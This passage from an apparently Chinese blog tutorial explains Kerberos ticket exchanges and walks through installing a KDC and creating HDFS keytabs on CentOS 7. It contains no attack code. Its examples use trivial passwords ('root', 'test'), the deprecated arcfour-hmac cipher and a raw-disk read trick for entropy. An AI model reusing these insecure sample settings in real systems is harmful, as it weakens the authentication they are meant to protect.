Key（SServer-Client）</code>和使用<code>Server</code>的<code>Master Key</code>进行加密的<code>Ticket</code>。该<code>Ticket</code>大体包含以下一些内容：</p><ul><li><p>Client name &amp; realm: 简单地说就是Domain name\Client</p></li><li><p>Client name &amp; realm: 简单地说就是Domain name\Client</p></li><li><p>End time: Ticket的到期时间</p></li></ul><p><code>Client</code>收到<code>KRB_TGS_REP</code>，使用<code>Logon Session Key（SKDC-Client）</code>解密第一部分后获得<code>Session Key（SServer-Client）</code>。有了<code>Session Key</code>和<code>Ticket，Client</code>就可以之间和<code>Server</code>进行交互，而无须在通过<code>KDC</code>作中间人了。所以我们说<code>Kerberos</code>是一种高效的认证方式，它可以直接通过<code>Client</code>和<code>Server</code>双方来完成，不像Windows NT 4下的<code>NTLM</code>认证方式，每次认证都要通过一个双方信任的第3方来完成。</p><p>我们现在来看看 <code>Client</code>如果使用<code>Ticket</code>和<code>Server</code>怎样进行交互的，这个阶段通过我们的第3个<code>Sub-protocol</code>来完成：<code>CS（Client/Server ）Exchange</code>。</p><ol start="3"><li>CS（Client/Server ）Exchange</li></ol><p>这个已经经介绍过。<code>Client</code>通过<code>TGS Exchange</code>获得<code>Client</code>和<code>Server</code>的<code>Session Key（SServer-Client）</code>，随后创建用于证明自己就是Ticket的真正所有者的<code>Authenticator</code>，并使用<code>Session Key（SServer-Client）</code>进行加密。最后将这个被加密过的<code>Authenticator</code>和<code>Ticket</code>作为<code>Application Service Request（KRB_AP_REQ）</code>发送给<code>Server</code>。除了上述两项内容之外，<code>KRB_AP_REQ</code>还包含一个<code>Flag</code>用于表示<code>Client</code>是否需要进行双向验证（<code>Mutual Authentication</code>）。</p><p><code>Server</code>接收到<code>KRB_AP_REQ</code>之后，通过自己的<code>Master Key</code>解密<code>Ticket</code>，从而获得<code>Session Key（SServer-Client）</code>。通过<code>Session Key（SServer-Client）</code>解密<code>Authenticator</code>，进而验证对方的身份。验证成功，让<code>Client</code>访问需要访问的资源，否则直接拒绝对方的请求。</p><p>对于需要进行双向验证，<code>Server</code>从<code>Authenticator</code>提取<code>Timestamp</code>，使用<code>Session Key（SServer-Client）</code>进行加密，并将其发送给<code>Client</code>用于<code>Client</code>验证<code>Server</code>的身份。</p><hr><p>以上是2000年的<code>Kerberos</code>技术，和今天我们使用的<code>Kerberos</code>是不太相同的，因为这样的一个认证过程有一个最大的隐患就是<strong>Long-term Key加密的数据在网络中传递</strong>。</p><p>解决办法也很简单：就是采用一个<code>Short-term</code>的<code>Session Key</code>，而不是<code>Server Master Key</code>对<code>Ticket</code>进行加密。这就是<code>Kerberos</code>的第四个<code>Sub-protocol</code>：<code>User2User Protocol</code>。</p><p>因为<code>KDC</code>是不是维护<code>Session Key</code>的，所以这个<code>Session key</code>只能靠申请<code>Ticket</code>的<code>Client</code>提供，所以在原先的第一步和第二步之间，<code>Client</code>还得对<code>Server</code>进行请求已获得<code>Server</code>和<code>KDC</code>之间的<code>Session Key</code>。而对于<code>Server</code>来说，他可以像<code>Client</code>一样通过<code>AS Exchange</code>获得他和<code>KDC</code>之间的<code>Session Key</code>（<code>SKDC-Server</code>）和一个封装了这个<code>Session Key</code>并被<code>KDC</code>的<code>Master Key</code>进行加密的<code>TGT</code>，一旦获得这个<code>TGT</code>，<code>Server</code>会缓存它，以待<code>Client</code>对它的请求。</p><p>所以现在添加完这个User2User的认证过程，这个过程有4个步骤组成，四个步骤如下：</p><ul><li><p>AS Exchange：Client通过此过程获得了属于自己的TGT，有了此TGT，Client可凭此向KDC申请用于访问某个Server的Ticket。</p></li><li><p>User2User：这一步的主要任务是获得封装了Server和KDC的Session Key（SKDC-Server）的属于Server的TGT。如果该TGT存在于Server的缓存中，则Server会直接将其返回给Client。否则通过AS Exchange从KDC获取。</p></li><li>TGS Exchange：Client通过向KDC提供自己的TGT，Server的TGT以及Authenticator向KDC申请用于访问Server的Ticket。KDC使用先用自己的Master Key解密Client的TGT获得SKDC-Client，通过SKDC-Client解密Authenticator验证发送者是否是TGT的真正拥有者，验证通过再用自己的Master Key解密Server的TGT获得KDC和Server 的Session Key（SKDC-Server），并用该Session Key加密Ticket返回给Client。</li><li>C/S Exchange：Client携带者通过KDC和Server 的Session Key（SKDC-Server）进行加密的Ticket和通过Client和Server的Session Key（SServer-Client）的Authenticator访问Server，Server通过SKDC-Server解密Ticket获得SServer-Client，通过SServer-Client解密Authenticator实现对Client的验证。</li></ul><hr><h3 id="4-Kerberos的安装和Apach原生HDFS的配置"><a href="#4-Kerberos的安装和Apach原生HDFS的配置" class="headerlink" title="4.Kerberos的安装和Apach原生HDFS的配置"></a>4.Kerberos的安装和Apach原生HDFS的配置</h3><p><strong>环境：</strong></p><ul><li>Linux版本：CentOS Linux release 7.2.1511 (Core)</li><li>CDH版本：5.13.3</li><li>JDK版本：jdk1.8.0_144</li><li>运行用户：root</li></ul><p><strong>准备工作：</strong></p><p>确认添加主机名解析到/etc/hosts 文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.16.0.3  master</span><br><span class="line">172.16.0.4  datanode0</span><br><span class="line">172.16.0.5  datanode1</span><br></pre></td></tr></table></figure><p>hostname 请使用小写，要不然在集成Kerberos 时会出现一些错误。</p><p><strong>安装Kerberos</strong>:</p><p>在<code>master</code>上安装包 <code>krb5</code>、<code>krb5-server</code> 和<code>krb5-client</code>。</p><p><code>yum install krb5-server -y</code></p><p>在所有节点上安装<code>krb5-devel</code>、<code>krb5-workstation</code>：</p><p><code>yum install krb5-devel krb5-workstation -y</code></p><p>修改配置文件</p><p>Kerberos的配置文件需要修改三个</p><p><code>/etc/krb5.conf</code></p><p><code>/var/kerberos/krb5kdc/kdc.conf</code></p><p><code>/var/kerberos/krb5kdc/kadm5.acl</code></p><p>配置Kerberos的krb5.conf</p><p>官网样例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = ATHENA.MIT.EDU</span><br><span class="line">    dns_lookup_kdc = true</span><br><span class="line">    dns_lookup_realm = false</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    ATHENA.MIT.EDU = &#123;</span><br><span class="line">        kdc = kerberos.mit.edu</span><br><span class="line">        kdc = kerberos-1.mit.edu</span><br><span class="line">        kdc = kerberos-2.mit.edu</span><br><span class="line">        admin_server = kerberos.mit.edu</span><br><span class="line">        master_kdc = kerberos.mit.edu</span><br><span class="line">    &#125;</span><br><span class="line">    EXAMPLE.COM = &#123;</span><br><span class="line">        kdc = kerberos.example.com</span><br><span class="line">        kdc = kerberos-1.example.com</span><br><span class="line">        admin_server = kerberos.example.com</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    mit.edu = ATHENA.MIT.EDU</span><br><span class="line"></span><br><span class="line">[capaths]</span><br><span class="line">    ATHENA.MIT.EDU = &#123;</span><br><span class="line">           EXAMPLE.COM = .</span><br><span class="line">    &#125;</span><br><span class="line">    EXAMPLE.COM = &#123;</span><br><span class="line">           ATHENA.MIT.EDU = .</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>说明：样例来自MIT官网，部分配置选项含义如下：</p><p><code>[logging]</code>：表示 server 端的日志的打印位置</p><p><code>[libdefaults]</code>：每种连接的默认配置，需要注意以下几个关键的小配置</p><p><code>default_realm = EXAMPLE.COM</code>：设置 Kerberos 应用程序的默认领域。如果您有多个领域，只需向 [realms] 节添加其他的语句。</p><p><code>ticket_lifetime</code>： 表明凭证生效的时限，一般为24小时。</p><p><code>renew_lifetime</code>： 表明凭证最长可以被延期的时限，一般为一个礼拜。当凭证过期之后，对安全认证的服务的后续访问则会失败。</p><p><code>clockskew</code>：时钟偏差是不完全符合主机系统时钟的票据时戳的容差，超过此容差将不接受此票据。通常，将时钟扭斜设置为 300 秒（5 分钟）。这意味着从服务器的角度看，票证的时间戳与它的偏差可以是在前后 5 分钟内。</p><p><code>udp_preference_limit= 1</code>：禁止使用 udp 可以防止一个 Hadoop 中的错误</p><p><code>[realms]</code>：列举使用的 realm。</p><p><code>kdc</code>：代表要 kdc 的位置。格式是 机器:端口</p><p><code>admin_server</code>：代表 admin 的位置。格式是 机器:端口</p><p><code>default_domain</code>：代表默认的域名</p><p><code>[appdefaults]</code>：可以设定一些针对特定应用的配置，覆盖默认配置。</p><p>经过一段时间的对比实验，最终配置文件设置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[logging]</span><br><span class="line">     default = FILE:/var/log/krb5libs.log</span><br><span class="line">     kdc = FILE:/var/log/krb5kdc.log</span><br><span class="line">     admin_server = FILE:/var/log/kadmind.log</span><br><span class="line"></span><br><span class="line">[libdefaults]</span><br><span class="line">     dns_lookup_realm = false</span><br><span class="line">     dns_lookup_kdc = false</span><br><span class="line">     ticket_lifetime = 24h</span><br><span class="line">     renew_lifetime = 7d</span><br><span class="line">     forwardable = true</span><br><span class="line">     renewable = true</span><br><span class="line">     udp_preference_limit = 1</span><br><span class="line">     rdns = false</span><br><span class="line">     pkinit_anchors = /etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">     default_realm = JIMI.COM</span><br><span class="line">     default_tgs_enctypes = arcfour-hmac</span><br><span class="line">     default_tkt_enctypes = arcfour-hmac</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    JIMI.COM = &#123;</span><br><span class="line">      kdc = master126</span><br><span class="line">      admin_server = master126</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">     .jimi.com = JIMI.COM</span><br><span class="line">    jimi.com = JIMI.COM</span><br></pre></td></tr></table></figure><p>接下来是第二个配置文件<code>/var/kerberos/krb5kdc/kdc.conf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[kdcdefaults]</span><br><span class="line"> kdc_ports = 88</span><br><span class="line"> kdc_tcp_ports = 88</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line"> JIMI.COM = &#123;</span><br><span class="line">  #master_key_type = aes256-cts</span><br><span class="line">  max_renewable_life= 7d 0h 0m 0s</span><br><span class="line">  acl_file = /var/kerberos/krb5kdc/kadm5.acl</span><br><span class="line">  dict_file = /usr/share/dict/words</span><br><span class="line">  admin_keytab = /var/kerberos/krb5kdc/kadm5.keytab</span><br><span class="line">  supported_enctypes = aes256-cts:normal aes128-cts:normal des3-hmac-sha1:normal arcfour-hmac:normal camellia256-cts:normal camellia128-cts:normal des-hmac-sha1:normal des-cbc-md5:normal des-cbc-crc:normal</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这边直接放上配置文件，官方的配置文件相当冗余，加上版本问题，我删除了很多选项，只留下了小部分，剩下的应该会以默认值运行。</p><p>贴上一点简单的选项说明：</p><p><code>EXAMPLE.COM</code>： 是设定的 <code>realms</code>。名字随意。<code>Kerberos</code> 可以支持多个 <code>realms</code>，会增加复杂度。大小写敏感，一般为了识别使用全部大写。这个 <code>realms</code> 跟机器的 <code>host</code> 没有大关系。</p><p><code>master_key_type</code>：和 <code>supported_enctypes</code> 默认使用 <code>aes256-cts</code>。JAVA 使用 <code>aes256-cts</code> 验证方式需要安装 JCE 包，见下面的说明。为了简便，你可以不使用 <code>aes256-cts</code> 算法，这样就不需要安装 <code>JCE</code> 。</p><p><code>acl_file</code>：标注了 admin 的用户权限，需要用户自己创建。文件格式是：<code>Kerberos_principal permissions</code> [target_principal] [restrictions]</p><p><code>supported_enctypes</code>：支持的校验方式。</p><p>admin_keytab：KDC 进行校验的 keytab。</p><p>这边要注意，如果系统是Centos5.6及以上系统，默认使用AES-256来加密，但是这个AES-256 JDK的安全包里默认不存在，所以要去<a href="https://www.oracle.com/technetwork/cn/java/javase/downloads/jce8-download-2133166-zhs.html" target="_blank" rel="noopener">Oracle</a>下载，但是这个密码增强包貌似对JDK过高的版本支持有BUG，但是暂时好像还没遇到，下载下来之后放到这个目录里：$JAVA_HOME/jre/lib/security</p><p>还有一个文件<code>/var/kerberos/krb5kdc/kadm5.acl</code>：</p><p>这个是权限控制文件，修改为</p><p><a href="mailto:`*/admin@JIMI.COM" target="_blank" rel="noopener">`*/admin@JIMI.COM</a>        *`</p><p>这三个配置文件中只有krb5.conf需要拷贝到集群中其他服务器</p><p>别的两个配置文件不需要分发到别的节点。</p><p><strong>创建数据库</strong>：</p><p>原理里面已经讲过了KDC里面有一个小型的数据库，下面是对这个数据库的操作。</p><p>在master上运行初始化数据库命令，其中 -r 指定对应的realm</p><p><code>kdb5_util create -r JIMI.COM -s</code></p><p>出现 <code>loading random data</code> 的时候另开个终端执行点消耗CPU的命令如<code>cat /dev/sda &gt; /dev/urandom</code> 可以加快随机数采集。该命令会在<code>/var/kerberos/krb5kdc/</code> 目录下创建 <code>principal</code> 数据库。</p><p>如果遇到数据库已经存在的提示，可以把 <code>/var/kerberos/krb5kdc/</code> 目录下的 principal 的相关文件都删除掉。默认的数据库名字都是 <code>principal</code>。可以使用 -d 指定数据库名字。</p><p>这个数据库相当重要，后面还会介绍。</p><p><strong>启动服务</strong>：</p><p>在master节点上运行：</p><p>centos 6：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chkconfig krb5kdc on </span><br><span class="line">chkconfig kadmin on </span><br><span class="line">service krb5kdc start </span><br><span class="line">service kadmin start</span><br></pre></td></tr></table></figure><p>centos 7：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start krb5kdc </span><br><span class="line">systemctl start kadmin </span><br><span class="line">systemctl status krb5kdc </span><br><span class="line">systemctl status kadmin</span><br></pre></td></tr></table></figure><hr><p><strong>创建Kerberos管理员</strong></p><p>Kerberos的管理，有两个方式，分别是kadmin.local 或 kadmin，至于使用哪个，取决于账户和权限访问。</p><ul><li><p>如果有访问 kdc 服务器的 root 权限，但是没有 kerberos admin 账户，使用 kadmin.local</p></li><li><p>如果没有访问 kdc 服务器的 root 权限，但是用 kerberos admin 账户，使用 kadmin</p></li></ul><p>在master上创建远程管理的程序员:</p><p>#手动输入两次密码，这里密码为 root</p><p><code>kadmin.local -q &quot;addprinc root/admin&quot;</code></p><p>#也可以不用手动输入密码</p><p><code>echo -e &quot;root\nroot&quot; | kadmin.local -q &quot;addprinc root/admin&quot;</code></p><p>#或者运行下面命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local &lt;&lt;eoj</span><br><span class="line">addprinc -pw root root/admin</span><br><span class="line">eoj</span><br></pre></td></tr></table></figure><p>系统时提示输入密码，密码不能为空，而且需要妥善保管。</p><p>测试Kerberos：</p><p>查看当前认证用户</p><p>#查看 principals</p><p><code>kadmin: list_principals</code></p><p>#添加一个新的principal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kadmin:  addprinc user1</span><br><span class="line">WARNING: no policy specified for user1@JIMI.COM; defaulting to no policy</span><br><span class="line">Enter password for principle</span><br><span class="line">Re-enter password for principal &quot;user1@JIMI.COM&quot;:</span><br><span class="line">Principal &quot;user1@JIMI.COM&quot; created.</span><br></pre></td></tr></table></figure><p>#删除 principal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kadmin:  delprinc user1</span><br><span class="line">Are you sure you want to delete the principal &quot;user1@JIMI.COM&quot;? (yes/no): yes</span><br><span class="line">Principal &quot;user1@JIMI.COM&quot; deleted.</span><br><span class="line">Make sure that you have removed this principal from all ACLs before reusing.</span><br><span class="line">kadmin:exit</span><br></pre></td></tr></table></figure><p>也可以直接通过下面的命令来执行</p><p>#提示需要输入密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin -p root/admin -q &quot;list_principals&quot;</span><br><span class="line">kadmin -p root/admin -q &quot;list_principals&quot;</span><br><span class="line">kadmin -p root/admin -q &quot;addprinc user2&quot;</span><br></pre></td></tr></table></figure><p>#不用输入密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q &quot;list_principals&quot;</span><br><span class="line">kadmin.local -q &quot;addprinc user2&quot;</span><br><span class="line">kadmin.local -q &quot;delprinc user2&quot;</span><br></pre></td></tr></table></figure><p>#创建一个测试用户test，密码设置为test：</p><p><code>echo -e &quot;test\ntest&quot; | kadmin.local -q &quot;addprinc test&quot;</code></p><p>#获取test用户的ticket 通过用户名和密码登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kinit test</span><br><span class="line">Password for test@JIMI.COM</span><br><span class="line">klist -e </span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: test@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:29:02  11/08/14 15:29:02  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">  renew until 11/17/14 15:29:02, Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>销毁test用户的ticket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kdestroy</span><br><span class="line">klist</span><br><span class="line">klist: No credentials cache found (ticket cache FILE:/tmp/krb5cc_0)</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>更新ticket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kinit root/admin</span><br><span class="line">Password for root/admin@JIMI.COM</span><br><span class="line">klist</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: root/admin@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:33:57  11/08/14 15:33:57  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">renew until 11/17/14 15:33:57</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br><span class="line">kinit -R</span><br><span class="line">klist</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: root/admin@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:34:05  11/08/14 15:34:05  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">renew until 11/17/14 15:33:57</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>抽取密钥并将其储存在本地 keytab 文件 /etc/krb5.keytab 中。这个文件由超级用户拥有，所以您必须是 root 用户才能在 kadmin shell 中执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q &quot;ktadd kadmin/admin&quot;</span><br><span class="line">klist -k /etc/krb5.keytab</span><br><span class="line">Keytab name: FILE:/etc/krb5.keytab</span><br><span class="line">KVNO Principal</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br></pre></td></tr></table></figure><p>HDFS上配置kerberos</p><p>创建认证规则</p><p>在 <code>Kerberos</code> 安全机制里，一个 <code>principal</code> 就是 <code>realm</code> 里的一个对象，一个 <code>principal</code> 总是和一个密钥（<code>secret key</code>）成对出现的。</p><p>这个 <code>principal</code> 的对应物可以是 <code>service</code>，可以是 <code>host</code>，也可以是 <code>user</code>，对于 <code>Kerberos</code> 来说，都没有区别。</p><p><code>Kdc(Key distribute center)</code> 知道所有 <code>principal</code> 的 <code>secret key</code>，但每个 <code>principal</code> 对应的对象只知道自己的那个 <code>secret key</code> 。这也是“共享密钥“的由来。</p><p>对于 <code>hadoop</code>，<code>principals</code> 的格式为</p><p><a href="mailto:`username/fully.qualified.domain.name@YOUR-REALM.COM" target="_blank" rel="noopener">`username/fully.qualified.domain.name@YOUR-REALM.COM</a>`</p><p>通过 <code>yum</code> 源安装的 <code>cdh</code> 集群中，NameNode和 DataNode 是通过 hdfs 启动的，故为集群中每个服务器节点添加两个<code>principals：hdfs</code>、HTTP。</p><p>在 KCD server 上（这里是 cdh1）创建 hdfs principal：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q "addprinc -randkey hdfs/datanode0@JIMI.COM"</span><br><span class="line">kadmin.local -q "addprinc -randkey hdfs/datanode1@JIMI.COM"</span><br><span class="line">kadmin.local -q "addprinc -randkey hdfs/master@JIMI.COM"</span><br></pre></td></tr></table></figure><p>-randkey<br>标志没有为新 <code>principal</code> 设置密码，而是指示 <code>kadmin</code> 生成一个随机密钥。之所以在这里使用这个标志，是因为此 <code>principal</code> 不需要用户交互。它是计算机的一个服务器账户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q "addprinc -randkey HTTP/ datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey HTTP/ datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey HTTP/ master@JIMI.COM "</span><br></pre></td></tr></table></figure><p>创建完成后，查看：</p><p><code>kadmin.local -q &quot;listprincs&quot;</code></p><p>手动创建keytab文件</p><p><code>keytab</code>是包含 <code>principals</code> 和加密 <code>principal key</code> 的文件。<code>keytab</code> 文件对于每个 <code>host</code>是唯一的，因为 <code>key</code> 中包含 <code>hostname</code>。<code>keytab</code>文件用于不需要人工交互和保存纯文本密码，实现到 <code>kerberos</code> 上验证一个主机上的 <code>principal</code>。因为服务器上可以访问 <code>keytab</code> 文件即可以以 <code>principal</code> 的身份通过 <code>kerberos</code> 的认证，所以，<code>keytab</code> 文件应该被妥善保存，应该只有少数的用户可以访问。</p><p>创建包含 hdfs principal 和 host principal 的 hdfs keytab：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xst -norandkey -k hdfs.keytab hdfs/fully.qualified.domain.name host/fully.qualified.domain.name</span><br></pre></td></tr></table></figure><p>创建包含 mapred principal 和 host principal 的 mapred keytab：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xst -norandkey -k mapred.keytab mapred/fully.qualified.domain.name host/fully.qualified.domain.name</span><br></pre></td></tr></table></figure><p>注意：上面的方法使用了xst的norandkey参数，有些kerberos不支持该参数。<br>当不支持该参数时有这样的提示：<code>Principal -norandkey does not exist</code>.，需要使用下面的方法来生成keytab文件:</p><p>在master节点，即KDC server节点上执行下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/datanode0@JIMI.COM"</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/datanode1@JIMI.COM"</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/master@JIMI.COM"</span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ master@JIMI.COM "</span><br></pre></td></tr></table></figure><p>这样，就会在 /var/kerberos/krb5kdc/ 目录下生成hdfs-unmerged.keytab 和 HTTP.keytab 两个文件，接下来使用 ktutil 合并者两个文件为 hdfs.keytab。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /var/kerberos/krb5kdc/</span><br><span class="line">ktutil</span><br><span class="line">ktutil: rkt hdfs-unmerged.keytab</span><br><span class="line">ktutil: rkt HTTP.keytab</span><br><span class="line">ktutil: wkt hdfs.keytab</span><br><span class="line">ktutil: exit</span><br></pre></td></tr></table></figure><p>使用 klist 即可查看 hdfs.keytab 文件列表：（省略）</p><p>验证是否正确合并了key，使用合并后的keytab，分别使用hdfs和host principals来获取证书。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kinit -k -t hdfs.keytab hdfs/master@JIMI.COM</span><br><span class="line">kinit -k -t hdfs.keytab HTTP/master@JIMI.COM</span><br></pre></td></tr></table></figure><p>如果出现错误：<code>kinit: Key table entry not found while getting initial credentials</code>，则上面的合并有问题，重新执行前面的操作。</p><p>部署kerberos keytab文件</p><p>拷贝 hdfs.keytab 文件到其他节点的 /etc/hadoop/conf 目录</p><p>并设置权限，分别在三个节点上运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown hdfs:hadoop /etc/hadoop/conf/hdfs.keytab</span><br><span class="line">chmod 400 /etc/hadoop/conf/hdfs.keytab</span><br></pre></td></tr></table></figure><p>原因：</p><p>由于 keytab 相当于有了永久凭证，不需要提供密码(如果修改<code>kdc</code>中的<code>principal</code>的密码，则该<code>keytab</code>就会失效)，所以其他用户如果对该文件有读权限，就可以冒充 <code>keytab</code> 中指定的用户身份访问 <code>hadoop</code>，所以 <code>keytab</code> 文件需要确保只对 <code>owner</code> 有读权限(0400)</p><p>修改hdfs配置文件，先停止集群</p><p>在集群总所有节点的<code>core-site.xml</code>文件中添加下面的配置：</p><figure class="highlight 